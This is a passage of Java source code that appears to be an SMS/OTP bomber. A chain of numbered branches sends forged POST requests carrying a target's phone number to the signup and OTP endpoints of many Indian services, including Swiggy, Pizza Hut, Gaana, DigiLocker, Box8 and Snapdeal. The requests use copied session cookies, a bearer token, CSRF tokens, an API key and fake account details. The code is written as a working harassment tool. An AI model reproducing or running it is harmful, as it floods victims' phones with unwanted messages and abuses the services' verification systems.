			con.setRequestProperty("sec-fetch-user", "?1");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			con.getResponseCode();
		}

		else if (count == 12) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.swiggy.com/dapi/auth/signup")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("__fetch_req__", "true");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "169");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"__cfduid=d160aa04979e4681aabe4544e361ca4811593089428; __SW=7hbFAWHukZChhMXDd0kdk_ygY-21LdRT; _device_id=49dc580e-9e63-424c-8069-bb95a048788d; _gcl_au=1.1.794806034.1593089431; _ga=GA1.2.1658653419.1593089431; _gid=GA1.2.1467808785.1593089431; fontsLoaded=1; _guest_tid=5b78564f-097b-4949-b462-8134a46d21b6; _sid=nk7ce8b2-c16d-4108-a0bc-822a10a86a5d; __cf_bm=7febcc053cb136352c09852148982484e8faad0e-1593138256-1800-AaILo3jBa8b5o6UAlAuVXFpQPwxX5mf+NmoDxzdTmgSOEVbOiDgX7/9gqHu1k/qAMwGAtCFCMMs1xXigeujT34I=; _gat_0=1");
			con.setRequestProperty("origin", "https://www.swiggy.com/");
			con.setRequestProperty("referer", "https://www.swiggy.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"mobile\":\"" + phone
					+ "\",\"name\":\"hindu bhai\",\"email\":\"gzespbhyujvyujhhjvortz@gmail.com\",\"password\":\"asAS@123\",\"referral\":\"\",\"otp\":\"\",\"_csrf\":\"iqNGOe7pRjiH-PiHc1Vo4Ss-PJbiuQ0mm_tI7-Ig\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			}
			con.getResponseCode();
		}

		else if (count == 13) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://api.pizzahut.io/v1/otp/generate")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "169");
			con.setRequestProperty("content-type", "application/json; charset=utf-8");
			con.setRequestProperty("origin", "https://online.pizzahut.co.in");
			con.setRequestProperty("referer", "https://www.swiggy.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "cross-site");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"phone\":\"+91" + phone + "\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 14) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://jsso.indiatimes.com/sso/crossapp/identity/web/registerUser").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("channel", "timesprime");
			con.setRequestProperty("content-length", "198");
			con.setRequestProperty("content-type", "application/json; charset=utf-8");
			con.setRequestProperty("cookie",
					"_col_uuid=5fa291f2-a42c-46c3-91f3-dda8b7d20914-6m6g; deviceid=1b7ph42dmqho16zadex85wnlb; lgc_deviceid=1b7ph42dmqho16zadex85wnlb; bm_sz=4A8E08F5AAF07870FA74E0BC4CDFC575~YAAQi7YRYIZnzN9yAQAA33yF7ghsPWS6Xzn+2XP1xow2Ob8LT+d1G+Jg/9RMa9eg8/r6EXL8BfVJLT9rsjZ79Im6sRARZBUdhxyB1BIPfGBnqG8G3VBLpKG2U+8RoGmSIXd/xOE+gfXUFW4mxe8PYzI1Jy4CU41X+pOZhrvHIxOs222HJOHYeiQnr+J+QPAmCnw5MA==; ak_bmsc=DA538B1831EAEF823E2908B10B66E3966011B68B09100000A961F55EA2F92942~pln/KbdyMLu1e/BkImDbPMtAVtfI5Dhx4Jse3zrI6LJCXON1H0+ceDD9pbMf1EXgtZukdcE/RBynNFllOXUNu1RWBk3ch0vXjpXFFwlzBZyyCL9+rko8el6GMC7PWf4o00SZPCWJw54iDEPu5LTmaUbONPyVelqPKRuTfZ0UuOYRNmhIU8DiSmJ/Zen7KB62LAbSYTVejTFQFeua3HBy+dFMRiybOrfrN+wJjMtfss68Coe0zUnreE1Juy9GZxuTXX; bm_sv=60737EE840062E45705D32CE55D06126~vAj/YcrUD1dCrzlEpaYsogAEyCH4iW2JH7yQV33K4uBoIOeRewAqQlJPJaxtx28a+McRJDHfmk+N5l/aMYCDVT8PvWzGM/A8aYhf9lHAVmkpPLfFPpT7gs6M8RdZPPM2YAEwUqPo+MaDKp1eqbURNo5UZHRdPa0CLIq2wt9DOJ0=; _abck=2B5423484E6D004DCEA7C597A4CAE8D7~-1~YAAQLbYRYLqf66tyAQAAT1KG7gSGkg4sSjMoBrl0GCqk2TeqGlx7JeoxK39ekQDfWBf2Ne++VTk8l4pUQewl5bIvV/4+8ktpzvmAdmIVYX0Z1So2xQvvhrKOrSbIixdgUIRP+6p0GIofKreT24LlCTVodYNFXJv3abNwziUxJ2feOX8H4ZYHD/j7hxwAzlTBI+TnoupY5YgFGpWlqZj+AEw9nhMn4ZbG+KDbSUkmrYjFcKEQZdGBtcnnNqdFp9axCGSyI6dpQwtSG+9BgSh1vYywmJRobAPaRJTWZWMPkfNNlN+YYXZBfQx1mjKCgQlRHIw/iU1EjSGWzpA=~0~1-ifsJYNPlKq-10000-100-3000-1||||~-1");
			con.setRequestProperty("origin", "https://www.timesprime.com");
			con.setRequestProperty("referer", "https://www.timesprime.com/login");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "cross-site");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"firstName\":\"Guest\",\"lastName\":null,\"gender\":null,\"dob\":null,\"mobile\":\""
					+ phone
					+ "\",\"password\":\"tp@9681095\",\"isSendOffer\":false,\"termsAccepted\":null,\"shareDataAllowed\":null,\"timespointsPolicy\":null}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		

		else if (count == 16) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.dineout.co.in/xhr-request/user_signup")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("cache-control", "max-age=0");
			con.setRequestProperty("content-length", "53");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"countly_webapp_uid=RrXHHmiJfVAWyg2pe5GonQ36Uz718nTe; _csrf=h3JpM0qAD7IMF2M9bsaIWc-j; connect.sid=s%3ARrXHHmiJfVAWyg2pe5GonQ36Uz718nTe.AWhchQew6eGjPF4AbcgUrVbNSRVE0DreMuqCbNclNgU; firstUser=1; _ga=GA1.3.2024560996.1593142018; _gid=GA1.3.207157691.1593142018; gaClientId=2024560996.1593142018; city_selected_for_branch=1; mobilecityselect=mumbai; mobilecityselect_girf=mumbai; _col_uuid=5fa291f2-a42c-46c3-91f3-dda8b7d20914-6m6g; city_name=Mumbai; city_id=1; WZRK_G=07134c9e6639409d809c2655ff1848d6; G_ENABLED_IDPS=google; _fbp=fb.2.1593142038834.1582479403; WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A2%2C%22s%22%3A1593142020%2C%22t%22%3A1593142150%7D");
			con.setRequestProperty("csrf-token", "XIVJKUBZ-wOlCK7K0uhxDH7CYdlMf_4wbCBA");
			con.setRequestProperty("origin", "https://www.dineout.co.in");
			con.setRequestProperty("referer", "https://www.dineout.co.in/mumbai");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"name\":\"rohanmehta\",\"email\":\"\",\"phone\":\"" + phone + "\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 17) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://accounts.digitallocker.gov.in/signup/send_otp")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("content-length", "25");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded");
			con.setRequestProperty("Host", "accounts.digitallocker.gov.in");
			con.setRequestProperty("origin", "https://accounts.digitallocker.gov.in");
			con.setRequestProperty("referer", "https://accounts.digitallocker.gov.in/signup/web_nonaadhaar");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			con.setRequestProperty("x-supported-image-formats", "webp,jpeg");
			String jason = "aadhaar_mobile=" + phone;
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 18) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://accounts.box8.co.in/customers/sign_up?origin=box8").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("content-length", "95");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("Authorization",
					"Bearer eyJraWQiOiIxZWQ1ZDFiNjI1NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I4OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE1OTMxNDI4ODUsImV4cCI6MTU5MzMwNDIwMCwic3NpZCI6IjkwMzMyZDUwLTI4NjYtNDhjNC1iYzNjLWQxYmQ5ZGYxMTE3ZTE1OTMxNDI4ODUiLCJhY2NfdHlwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6ImZsN2U5M2ExLW9mdm4tM2wzdC0xaGluLW14N2Rob2s5bDhveiIsImRldmljZV90b2tlbiI6Im51bGwiLCJkZXZpY2VfZGJfaWQiOiJTM0J4ZEZwUVFsUndlRzVWSzFoNE9ETkZhRmw2VjNwcWMzRlFOMEkwWjB4VmRrUnpVVFJtVEZaaWRFWnRSMlkzUlUxTk9XcExjRmwyYUVGMk1tWjRiUzB0ZEVneVdFMWxOMmMwUzJGWFNYRnJXbm93VHpsWVVUMDktLWY2ZGQ4MDkxYzg3ODZjYjIxYzMxYzI3Zjg1ZDE5ZjU3ZTdjYWUxMWYiLCJicmFuZF9pZCI6MSwiYXVkIjoiY3VzdG9tZXIiLCJpc3MiOiJhY2NvdW50cy5ib3g4LmNvLmluIn0.hOfXZPJv5ngTa6_0tHQAvCQQ9Vdnwl3wlRUg00H1osXqap9T_ALXzSbEbft009lp5vg_-TARAaazSbaPUnrIXm_87xGILEvmC46QNvmEgDPtBiTYr8n6kuHCjS_0IHBSWQjtc-id9XAfIsG4ElJpt-OV-x0l1RMRd0W3xSUEFwsRZao4MXu1MQQGuwsuc6g808w2ts-4-x9qXbYW0TeY2c2U9sDswLVm2mSI1akQRpAED0mEoITmWHGIp4aIxQLHv5vGGWq_kLjCpd1QUTAIglrF6XP3_1YDQJnFrv7UWMfnWm24d70Bo-WrR3SJMFwrMAwAK0OuRlf9Daa5WOxM0chZR-t3ww4Q_4zOpBExutoHQMxs--0CfY7Fgp30ptoLhCjAMTO4Tw52S_iw82d6lHD0FAZOf0R-SllWsoNx7xqduVkazDopr0YLvJQPZdS6T1Gh6RKzfYTjMGsQ1sNgYEa7JWMgdncPL34uoePxUo7p_hwV7uvOvJYcybnyyUszv3ZAnWVlQRVTIvlWK6nC9U5wzp9d0Au-2V49HJ-dUaKskeeSY0DWSAWYHRoIVnFjLmg8_9f-uy8HM6i2pHlR6w8Mjc2bEg4z5EmbXD1NfimQzamHx3hXv4BFaTsga36MFRIiphFpHGehF9BeL-jGRoGAga--2XUd2g8-F7pDGqI");
			con.setRequestProperty("origin", "https://box8.in");
			con.setRequestProperty("referer", "https://box8.in/");
			con.setRequestProperty("Host", "accounts.box8.co.in");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"phone_no\":\"" + phone
					+ "\",\"name\":\"kannu nagar\",\"email\":\"mrkhan@ggail.com\",\"password\":\"dfGK@173\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 19) {
			HttpURLConnection con = (HttpURLConnection) new URL(" https://www.cure.fit/api/auth/loginPhoneSendOtp")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("content-length", "49");
			con.setRequestProperty("apiKey", "9d153009-e961-4718-a343-2a36b0a1d1fd");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"st=s%3ACFAPP%3Ad278f536-c4ee-4418-b114-9af550aaca29.zerNsVP0qDTWypjqxNbR7I%2Bu36LX9TOpXNuaQBFdl48; at=s%3ACFAPP%3A39382a9b-e51c-4d4a-a2fb-4db9c3c24e92.50ib17zcKvx62OTVyRc6eLaU67r1DCU7FNdwqj78daI; deviceId=s%3A359b8d62-0e5e-4927-bfd7-9736db37479c.GL76C3CzAnl4N4%2BxYloEShImuCrpPmnLPjzfZ3QigVc; _gcl_au=1.1.169510867.1593143225; _ga=GA1.2.996613655.1593143225; _gid=GA1.2.1044603311.1593143225; _gat_UA-92412423-1=1; _fbp=fb.1.1593143225644.1429644833; WZRK_G=a1b18b52c4e24211bc50aec28c1be794; WZRK_S_R55-ZZ7-WW5Z=%7B%22p%22%3A1%2C%22s%22%3A1593143225%2C%22t%22%3A1593143236%7D");
			con.setRequestProperty("origin", "https://www.cure.fit");
			con.setRequestProperty("referer", "https://www.cure.fit/eat/eatordernow");
			con.setRequestProperty("Host", "www.cure.fit");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"phone\":\"" + phone + "\",\"countryCallingCode\":\"+91\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 10) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("channel", "gaana.com");
			con.setRequestProperty("content-length", "27");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"_col_uuid=5fa291f2-a42c-46c3-91f3-dda8b7d20914-6m6g; deviceid=1b7ph42dmqho16zadex85wnlb; lgc_deviceid=1b7ph42dmqho16zadex85wnlb; bm_sz=4A8E08F5AAF07870FA74E0BC4CDFC575~YAAQi7YRYIZnzN9yAQAA33yF7ghsPWS6Xzn+2XP1xow2Ob8LT+d1G+Jg/9RMa9eg8/r6EXL8BfVJLT9rsjZ79Im6sRARZBUdhxyB1BIPfGBnqG8G3VBLpKG2U+8RoGmSIXd/xOE+gfXUFW4mxe8PYzI1Jy4CU41X+pOZhrvHIxOs222HJOHYeiQnr+J+QPAmCnw5MA==; ak_bmsc=DA538B1831EAEF823E2908B10B66E3966011B68B09100000A961F55EA2F92942~pln/KbdyMLu1e/BkImDbPMtAVtfI5Dhx4Jse3zrI6LJCXON1H0+ceDD9pbMf1EXgtZukdcE/RBynNFllOXUNu1RWBk3ch0vXjpXFFwlzBZyyCL9+rko8el6GMC7PWf4o00SZPCWJw54iDEPu5LTmaUbONPyVelqPKRuTfZ0UuOYRNmhIU8DiSmJ/Zen7KB62LAbSYTVejTFQFeua3HBy+dFMRiybOrfrN+wJjMtfss68Coe0zUnreE1Juy9GZxuTXX; _ga=GA1.2.404680335.1593141204; _gid=GA1.2.1973585885.1593141204; _em_vt=c5256689-9a36-4320-9734-db3b7ba3b872-172ee9d95fa-ac628567; _em_gc=IN; _em_mb=0; __gads=ID=bce32151774bc2ef:T=1593141205:S=ALNI_MaJKmz7foIsNhvTudHaIg20OMIhbQ; _em_dmp=1593141207347; geolocation=Delhi; bm_sv=60737EE840062E45705D32CE55D06126~vAj/YcrUD1dCrzlEpaYsogAEyCH4iW2JH7yQV33K4uBoIOeRewAqQlJPJaxtx28a+McRJDHfmk+N5l/aMYCDVT8PvWzGM/A8aYhf9lHAVmnuN8HSq/MBmRg3cr5+yrvwzh8cfdUJKMVTEV5ZwCmlXXEK/2pkmOv4g2KdD6FSlsQ=; _abck=2B5423484E6D004DCEA7C597A4CAE8D7~-1~YAAQLbYRYPwg7KtyAQAAFZ6n7gRXvQxhoF4iVMgaoXOXZrY5AFvd0+uBQZx4XMdQfaXv7gaIRj3hhIxSL5Xyz5wfQdDS+t7YgQKlliywXvz67O3EgkLYsBxFOueWJyQU8vIrVuf9NOKUQ+3T3ZqLTi02hDt3xpmPIakgm8yH5etlXsGNjfhBTvphv2u7qGPphd2kFvl54722vmTb/je6BWhRc3UbiJOuYxhRWtALsIawy8iJELJkJOgLMWGC4vLz3WeaBKtAccFCcLDOg2xP+rBUVzziKnAIN+wgdU0XvSSChAmlU2Q0SCtvuNN8VDisO5SIUGAp7QSEBuU=~0~-1~-1");
			con.setRequestProperty("origin", "https://gaana.com");
			con.setRequestProperty("referer", "https://gaana.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"mobile\":\"+91-" + phone + "\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 21) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://www.firstcry.com/m/register?URL=https://www.firstcry.com").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept",
					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("cache-control", "max-age=0");
			con.setRequestProperty("content-length", "168");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded");
			con.setRequestProperty("cookie",
					"FingerPrint=b8c37b6f2dc7c4e791dd8609a43beaea1975f56d74037927c91120dc28e6f409NbVfHtOmJhBgWhBkAfsaAsSdI9hn4DS4HswdT9w939; _ICU_=0%230%230; _$FC$_cookies_=0%7C0; $FC_Register_cookies$=2; FC_session_ck=1; _$FC_TrackingMkt$=Direct; _$FC_TrackingMkt3$=Direct; _$FC_SID$=E0A4DE17-E2DF-0D8B-1AF5-F13DCA1B59CA; ASP.NET_SessionId=lweqfiollt54tkwggsp140rs; ci_session=9b0d34e4caf57a46867f330286063c962b180332; socialredirect=https%3A%2F%2Fwww.firstcry.com; login=2020-06-27+05%3A13%3A29; _ga=GA1.2.255382407.1593148484; _gid=GA1.2.1314856909.1593148484; RT=\"z=1&dm=firstcry.com&si=4tsk9kocx7m&ss=kbvrdvzn&sl=0&tt=0\"");
			con.setRequestProperty("origin", "https://www.firstcry.com");
			con.setRequestProperty("referer", "https://www.firstcry.com/m/login?URL=https://www.firstcry.com");
			con.setRequestProperty("sec-fetch-dest", "document");
			con.setRequestProperty("sec-fetch-mode", "navigate");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("sec-fetch-user", "?1");
			con.setRequestProperty("upgrade-insecure-requests", "1");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "redirecturl=https%3A%2F%2Fwww.firstcry.com&notemail=2&by=1&onetab=&FcSocialToken=&usrname=rihanna+luton&usrmb="
					+ phone + "&usremail=hazzzel%40ggail.com&usrpass=dsLS%40173";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 22) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/auth/login?ajax=true&mobileOnly=false&doAction=")
							.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "103");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded");
			con.setRequestProperty("cookie",
					"a_n_u_a=1; jr_token=true%3F%3Ff49e3000-fe41-4511-818a-10e2ff53a9b4%3F%3Fjoulroad%3F%3F02ce2d0f-a5cf-4105-ab87-291ad4e0c145%3F%3FGuest; _ruid=09b455b7-6fc6-4be1-a4b9-ce85362b4cba; lrVr=v2; newCssOpt=v1; nH=1; _session_id=dd9066ea50ac0f4dc47e86c26707d3a0; testCookie=v2; deviceWidth=1280; deviceHeight=619; _gcl_au=1.1.1301463539.1593149208; _ga=GA1.2.1289404320.1593149208; _gid=GA1.2.2071295690.1593149208; _gat_UA-103572518-6=1; _fbp=fb.1.1593149208797.2121873488; _uetsid=c921f61b-7078-39ab-8fdf-4d39eb8f1d16; _uetvid=edb47765-0ee8-c94d-77fc-cc756e72a142; duid=ab72f5c9ae14045f7793a1649f419740; gender=M; AWSALB=Toi5HCv8j4TsCM1URsVhELzqbLMBCQ4o0F1yvmYPAXXQf8ef3u7Ntgkz2LhA4c3VLo3qe7gt3ax++60Zdg2KWWL6q7WB1UU6C8jnilnCy4fa7y7TrFlYXz7dhRVo; AWSALBCORS=Toi5HCv8j4TsCM1URsVhELzqbLMBCQ4o0F1yvmYPAXXQf8ef3u7Ntgkz2LhA4c3VLo3qe7gt3ax++60Zdg2KWWL6q7WB1UU6C8jnilnCy4fa7y7TrFlYXz7dhRVo");
			con.setRequestProperty("origin", "https://www.limeroad.com");
			con.setRequestProperty("referer", "https://www.limeroad.com/auth/login");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "utf8=%E2%9C%93&authenticity_token=8EZgJzMxc8LkKGahCOh6GDCJTD%2B%2BVbB8HMi6mpceaYQ%3D&user_id="
					+ phone + "";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 23) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.snapdeal.com/signupAjax/")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("content-length", "306");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded");
			con.setRequestProperty("cookie",
					"alps=sgpt; isWebP=true; JSESSIONID=B45243CE265D57FE5C745AC043E9D135; u=159314955285548641; sd.zone=Z26; xg=eyJwcyI6eyJzcF9zbGFiIjoiRSIsInVybCI6IlMxIn0sInVpZCI6eyJndWlkIjoiYzhmMDMyZTktNmY3Yy00ZjJjLWIwNTQtNTJmNjQwMzUxMzI4In19fHwxNTkzMTUxMzUyODU4; xc=eyJwcyI6eyJzcF9zbGFiIjoiRSIsInVybCI6IlMxIn19; st=utm_source%3DINLINK%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; vt=utm_source%3DINLINK%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; lt=utm_source%3DINLINK%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; SCOUTER=x4bhsft360k5eq; _uetsid=da06f8a2-3f26-c629-af7e-ced09707928d; _uetvid=d1f6bee6-1381-5443-2f75-40855b82bdba; sdCPW=false; lang=en; f5_cspm=1234; RT=\"sl=2&ss=1593149552024&tt=11649&obo=0&sh=1593149564071%3D2%3A0%3A11649%2C1593149560800%3D1%3A0%3A8756&dm=www.snapdeal.com&si=rpqoaivc37h&rl=1&ld=1593149564071\"; _sdDPPageId=1593149581351_7034_159314955285548641; s_sess=%20s_cc%3Dtrue%3B%20s_ppv%3D100%3B%20s_sq%3D%3B; s_pers=%20s_vnum%3D1595741560617%2526vn%253D1%7C1595741560617%3B%20gpv_pn%3DuserCheck%7C1593151400587%3B%20s_invisit%3Dtrue%7C1593151400592%3B; Megatron=!mV/1B5WeLb9W+CT/TVJKKix4ydLwRWunz9m8ItHZd/mRM4mx2F2osIpXPypcHBqbNLKLZquVjCb6HbI=");
			con.setRequestProperty("Host", "www.snapdeal.com");
			con.setRequestProperty("origin", "https://www.snapdeal.com");
			con.setRequestProperty("referer", "https://www.snapdeal.com/login");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "j_number=" + phone
